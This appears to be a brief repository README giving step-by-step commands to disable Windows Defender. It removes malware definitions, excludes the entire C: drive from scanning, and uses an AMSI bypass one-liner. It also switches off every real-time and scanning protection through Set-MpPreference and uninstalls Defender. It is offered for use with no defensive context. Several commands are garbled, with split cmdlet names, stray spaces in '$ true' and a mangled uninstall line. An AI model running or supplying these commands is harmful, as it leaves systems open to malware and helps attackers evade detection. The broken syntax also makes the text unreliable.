# Disable Windows Defender



[![Build Status](https://travis-ci.org/joemccann/dillinger.svg?branch=master)](https://travis-ci.org/joemccann/dillinger)

#### 1. In Administratir CMD run this Command

    
    C:\Program Files\Windows Defender\MpCmdRun.exe -RemoveDefinitions -All Set-Mp Preference -DisableIOAVProtection $true
    

#### 2. Powershell
    
    PowerShell :- Add-Mp Preference -ExeclusionPath "C:/"
    

#### 3 MSI
    
    
    "[Ref].Assembly.GetType('System.Management.Automation.Amsiutils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"


----------------------------------------



#### 0x1. Powershell :

    
    Set-MpPreference -DisableRealtimeMonitoring $ true -DisableAutoExclusions $ true -DisablePrivacyMode $ true -DisableBehaviorMonitoring $ true -DisableIntrusionPreventionSystem $ true -DisableIOAVProtection $ true -DisableScriptScanning $ true -DisableArchiveScanning $ true -DisableCatchupFullScan $ true -DisableCatchupQuickScan $ true -DisableEmailScanning $ true -DisableRemovableDriveScanning $ true -DisableRestorePoint $ true -DisableScannedMappedNetworkDrivesForFullScan $ true -DisableScanningNetworkFiles $ true -DisableBlockAtFirstSeen $ true
    
#### 0x2. Uninstall Windows Defender
     Uninstall-WindowsFeature-Windows-Defender-Name

